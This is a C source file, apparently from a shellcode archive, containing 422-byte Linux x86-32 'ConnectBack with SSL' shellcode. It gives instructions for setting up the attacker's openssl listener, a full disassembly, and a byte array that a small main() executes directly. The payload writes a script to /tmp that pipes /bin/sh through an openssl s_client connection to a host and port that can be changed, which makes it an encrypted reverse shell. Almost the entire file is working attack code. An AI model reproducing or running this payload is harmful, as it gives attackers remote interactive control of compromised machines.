/*
**
** Title:     Linux/x86-32 - ConnectBack with SSL connection - 422 bytes
** Date:      2011-06-08
** Tested on: ArchLinux i686
** Author:    Jonathan Salwan - twitter: @jonathansalwan
**
** http://shell-storm.org
**
**
** Configurations server
** ===========================================================================
** jonathan@ArchLinux [ssl] $ openssl genrsa -des3 -out server.key 1024
** jonathan@ArchLinux [ssl] $ openssl req -new -key server.key -out server.csr
** jonathan@ArchLinux [ssl] $ cp server.key server.key.org
** jonathan@ArchLinux [ssl] $ openssl rsa -in server.key.org -out server.key
** jonathan@ArchLinux [ssl] $ openssl x509 -req -days 365 -in server.csr -sign
** key server.key -out server.crt
** jonathan@ArchLinux [ssl] $ ll
** total 16
** -rw-r--r-- 1 jonathan users 757 Jun  8 09:36 server.crt
** -rw-r--r-- 1 jonathan users 603 Jun  8 09:36 server.csr
** -rw-r--r-- 1 jonathan users 887 Jun  8 09:36 server.key
** -rw-r--r-- 1 jonathan users 963 Jun  8 09:36 server.key.org
** jonathan@ArchLinux [ssl] $
**
**
** Running server
** ===========================================================================
** jonathan@ArchLinux [ssl] $ openssl s_server -key server.key -cert server.cr
** t -accept 8080
**
**
** After the server was opened, you can send the shellcode.
** Warning! The client need tsch and openssl installed.
**
**
** Informations shellcode
** ===========================================================================
**
** Reverse TCP with SSL (why not)
** Linux x86 32bits
** 422 bytes
**
**
** ASM sources
** ===========================================================================
**
** 08048054 <main>:
** 8048054:     31 c0                     xor    %eax,%eax
** 8048056:     50                        push   %eax
** 8048057:     6a 65                     push   $0x65
** 8048059:     68 6b 70 69 70            push   $0x7069706b
** 804805e:     68 2f 62 61 63            push   $0x6361622f
** 8048063:     68 2f 74 6d 70            push   $0x706d742f
** 8048068:     89 e3                     mov    %esp,%ebx
** 804806a:     b0 0a                     mov    $0xa,%al
** 804806c:     cd 80                     int    $0x80
** 804806e:     85 c0                     test   %eax,%eax
** 8048070:     75 32                     jne    80480a4 <del2>
** 8048072:     31 c0                     xor    %eax,%eax
** 8048074:     31 db                     xor    %ebx,%ebx
** 8048076:     31 d2                     xor    %edx,%edx
** 8048078:     b3 01                     mov    $0x1,%bl
** 804807a:     31 c0                     xor    %eax,%eax
** 804807c:     50                        push   %eax
** 804807d:     6a 6e                     push   $0x6e
** 804807f:     66 68 64 5c               pushw  $0x5c64
** 8048083:     68 6c 65 74 65            push   $0x6574656c
** 8048088:     68 65 20 64 65            push   $0x65642065
** 804808d:     68 6b 70 69 70            push   $0x7069706b
** 8048092:     68 2f 62 61 63            push   $0x6361622f
** 8048097:     68 2f 74 6d 70            push   $0x706d742f
** 804809c:     89 e1                     mov    %esp,%ecx
** 804809e:     b2 17                     mov    $0x17,%dl
** 80480a0:     b0 04                     mov    $0x4,%al
** 80480a2:     cd 80                     int    $0x80

** 080480a4 <del2>:
** 80480a4:     31 c0                     xor    %eax,%eax
** 80480a6:     50                        push   %eax
** 80480a7:     66 68 73 6c               pushw  $0x6c73
** 80480ab:     68 2f 63 62 73            push   $0x7362632f
** 80480b0:     68 2f 74 6d 70            push   $0x706d742f
** 80480b5:     89 e3                     mov    %esp,%ebx
** 80480b7:     b0 0a                     mov    $0xa,%al
** 80480b9:     cd 80                     int    $0x80
** 80480bb:     85 c0                     test   %eax,%eax
** 80480bd:     75 2a                     jne    80480e9 <open>
** 80480bf:     31 c0                     xor    %eax,%eax
** 80480c1:     31 db                     xor    %ebx,%ebx
** 80480c3:     31 d2                     xor    %edx,%edx
** 80480c5:     50                        push   %eax
** 80480c6:     68 65 64 5c 6e            push   $0x6e5c6465
** 80480cb:     68 65 6c 65 74            push   $0x74656c65
** 80480d0:     68 73 6c 20 64            push   $0x64206c73
** 80480d5:     68 2f 63 62 73            push   $0x7362632f
** 80480da:     68 2f 74 6d 70            push   $0x706d742f
** 80480df:     89 e1                     mov    %esp,%ecx
** 80480e1:     b3 01                     mov    $0x1,%bl
** 80480e3:     b2 14                     mov    $0x14,%dl
** 80480e5:     b0 04                     mov    $0x4,%al
** 80480e7:     cd 80                     int    $0x80
**
** 080480e9 <open>:
** 80480e9:     31 c0                     xor    %eax,%eax
** 80480eb:     31 c9                     xor    %ecx,%ecx
** 80480ed:     31 d2                     xor    %edx,%edx
** 80480ef:     66 b9 41 04               mov    $0x441,%cx
** 80480f3:     66 ba a4 01               mov    $0x1a4,%dx
** 80480f7:     50                        push   %eax
** 80480f8:     66 68 73 6c               pushw  $0x6c73
** 80480fc:     68 2f 63 62 73            push   $0x7362632f
** 8048101:     68 2f 74 6d 70            push   $0x706d742f
** 8048106:     89 e3                     mov    %esp,%ebx
** 8048108:     b0 05                     mov    $0x5,%al
** 804810a:     cd 80                     int    $0x80
** 804810c:     89 c6                     mov    %eax,%esi
**
** 0804810e <wtite>:
** 804810e:     31 d2                     xor    %edx,%edx
** 8048110:     89 f3                     mov    %esi,%ebx
** 8048112:     31 c0                     xor    %eax,%eax
** 8048114:     50                        push   %eax
** 8048115:     66 68 70 65               pushw  $0x6570
** 8048119:     68 63 6b 70 69            push   $0x69706b63
** 804811e:     68 70 2f 62 61            push   $0x61622f70
** 8048123:     68 3e 2f 74 6d            push   $0x6d742f3e
** 8048128:     68 73 68 20 31            push   $0x31206873
** 804812d:     68 6e 2f 74 63            push   $0x63742f6e
** 8048132:     68 20 2f 62 69            push   $0x69622f20
** 8048137:     68 70 65 20 7c            push   $0x7c206570
** 804813c:     68 63 6b 70 69            push   $0x69706b63
** 8048141:     68 70 2f 62 61            push   $0x61622f70
** 8048146:     68 3c 2f 74 6d            push   $0x6d742f3c
**
** "\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x38\x30\x38\x30" >----------+
** localhost:8080                                                        |
** If you change that, you need to change write(..., ..., size_t) (%edx) |
**                                                                       |
** 804814b:     68 38 30 20 30            push   $0x30203038         <---+
** 8048150:     68 74 3a 38 30            push   $0x30383a74         <---+
** 8048155:     68 6c 68 6f 73            push   $0x736f686c         <---+
** 804815a:     68 6c 6f 63 61            push   $0x61636f6c         <---+
**
**
** 804815f:     68 65 63 74 20            push   $0x20746365
** 8048164:     68 63 6f 6e 6e            push   $0x6e6e6f63
** 8048169:     68 6e 74 20 2d            push   $0x2d20746e
** 804816e:     68 63 6c 69 65            push   $0x65696c63
** 8048173:     68 6c 20 73 5f            push   $0x5f73206c
** 8048178:     68 65 6e 73 73            push   $0x73736e65
** 804817d:     68 6e 2f 6f 70            push   $0x706f2f6e
** 8048182:     68 72 2f 62 69            push   $0x69622f72
** 8048187:     68 20 2f 75 73            push   $0x73752f20
** 804818c:     68 70 20 26 26            push   $0x26262070
** 8048191:     68 69 70 65 20            push   $0x20657069
** 8048196:     68 61 63 6b 70            push   $0x706b6361
** 804819b:     68 6d 70 2f 62            push   $0x622f706d
** 80481a0:     68 64 20 2f 74            push   $0x742f2064
** 80481a5:     68 6d 6b 6e 6f            push   $0x6f6e6b6d
** 80481aa:     89 e1                     mov    %esp,%ecx
** 80481ac:     b2 77                     mov    $0x77,%dl
** 80481ae:     31 c0                     xor    %eax,%eax
** 80481b0:     b0 04                     mov    $0x4,%al
** 80481b2:     cd 80                     int    $0x80
**
** 080481b4 <close>:
** 80481b4:     31 c0                     xor    %eax,%eax
** 80481b6:     b0 06                     mov    $0x6,%al
** 80481b8:     89 f3                     mov    %esi,%ebx
** 80481ba:     cd 80                     int    $0x80
**
** 080481bc <execve>:
** 80481bc:     31 c0                     xor    %eax,%eax
** 80481be:     50                        push   %eax
** 80481bf:     66 68 73 6c               pushw  $0x6c73
** 80481c3:     68 2f 63 62 73            push   $0x7362632f
** 80481c8:     68 2f 74 6d 70            push   $0x706d742f
** 80481cd:     89 e3                     mov    %esp,%ebx
** 80481cf:     50                        push   %eax
** 80481d0:     66 68 2d 65               pushw  $0x652d
** 80481d4:     89 e1                     mov    %esp,%ecx
** 80481d6:     50                        push   %eax
** 80481d7:     6a 68                     push   $0x68
** 80481d9:     66 68 2f 73               pushw  $0x732f
** 80481dd:     68 2f 62 69 6e            push   $0x6e69622f
** 80481e2:     89 e2                     mov    %esp,%edx
** 80481e4:     50                        push   %eax
** 80481e5:     53                        push   %ebx
** 80481e6:     51                        push   %ecx
** 80481e7:     52                        push   %edx
** 80481e8:     89 e1                     mov    %esp,%ecx
** 80481ea:     89 d3                     mov    %edx,%ebx
** 80481ec:     31 d2                     xor    %edx,%edx
** 80481ee:     b0 0b                     mov    $0xb,%al
** 80481f0:     cd 80                     int    $0x80
**
** 080481f2 <exit>:
** 80481f2:     31 c0                     xor    %eax,%eax
** 80481f4:     b0 01                     mov    $0x1,%al
** 80481f6:     31 db                     xor    %ebx,%ebx
** 80481f8:     cd 80                     int    $0x80
**
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char SC[] = "\x31\xc0\x50\x6a\x65\x68\x6b\x70\x69\x70\x68\x2f\x62\x61\x63"
            "\x68\x2f\x74\x6d\x70\x89\xe3\xb0\x0a\xcd\x80\x85\xc0\x75\x32"
            "\x31\xc0\x31\xdb\x31\xd2\xb3\x01\x31\xc0\x50\x6a\x6e\x66\x68"
            "\x64\x5c\x68\x6c\x65\x74\x65\x68\x65\x20\x64\x65\x68\x6b\x70"
            "\x69\x70\x68\x2f\x62\x61\x63\x68\x2f\x74\x6d\x70\x89\xe1\xb2"
            "\x17\xb0\x04\xcd\x80\x31\xc0\x50\x66\x68\x73\x6c\x68\x2f\x63"
            "\x62\x73\x68\x2f\x74\x6d\x70\x89\xe3\xb0\x0a\xcd\x80\x85\xc0"
            "\x75\x2a\x31\xc0\x31\xdb\x31\xd2\x50\x68\x65\x64\x5c\x6e\x68"
            "\x65\x6c\x65\x74\x68\x73\x6c\x20\x64\x68\x2f\x63\x62\x73\x68"
            "\x2f\x74\x6d\x70\x89\xe1\xb3\x01\xb2\x14\xb0\x04\xcd\x80\x31"
            "\xc0\x31\xc9\x31\xd2\x66\xb9\x41\x04\x66\xba\xa4\x01\x50\x66"
            "\x68\x73\x6c\x68\x2f\x63\x62\x73\x68\x2f\x74\x6d\x70\x89\xe3"
            "\xb0\x05\xcd\x80\x89\xc6\x31\xd2\x89\xf3\x31\xc0\x50\x66\x68"
            "\x70\x65\x68\x63\x6b\x70\x69\x68\x70\x2f\x62\x61\x68\x3e\x2f"
            "\x74\x6d\x68\x73\x68\x20\x31\x68\x6e\x2f\x74\x63\x68\x20\x2f"
            "\x62\x69\x68\x70\x65\x20\x7c\x68\x63\x6b\x70\x69\x68\x70\x2f"
            "\x62\x61\x68\x3c\x2f\x74\x6d"
            /* localhost:8080 */
            "\x68\x38\x30\x20\x30\x68\x74\x3a\x38\x30\x68\x6c\x68\x6f\x73"
            "\x68\x6c\x6f\x63\x61"
            /* EOF */
            "\x68\x65\x63\x74\x20\x68\x63\x6f\x6e\x6e\x68\x6e\x74\x20\x2d"
            "\x68\x63\x6c\x69\x65\x68\x6c\x20\x73\x5f\x68\x65\x6e\x73\x73"
            "\x68\x6e\x2f\x6f\x70\x68\x72\x2f\x62\x69\x68\x20\x2f\x75\x73"
            "\x68\x70\x20\x26\x26\x68\x69\x70\x65\x20\x68\x61\x63\x6b\x70"
            "\x68\x6d\x70\x2f\x62\x68\x64\x20\x2f\x74\x68\x6d\x6b\x6e\x6f"
            "\x89\xe1\xb2\x77\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\x89"
            "\xf3\xcd\x80\x31\xc0\x50\x66\x68\x73\x6c\x68\x2f\x63\x62\x73"
            "\x68\x2f\x74\x6d\x70\x89\xe3\x50\x66\x68\x2d\x65\x89\xe1\x50"
            "\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe2\x50\x53"
            "\x51\x52\x89\xe1\x89\xd3\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0"
            "\x01\x31\xdb\xcd\x80";


int main(void)
{
   fprintf(stdout,"Length: %d\n",strlen(SC));
   (*(void(*)()) SC)();
}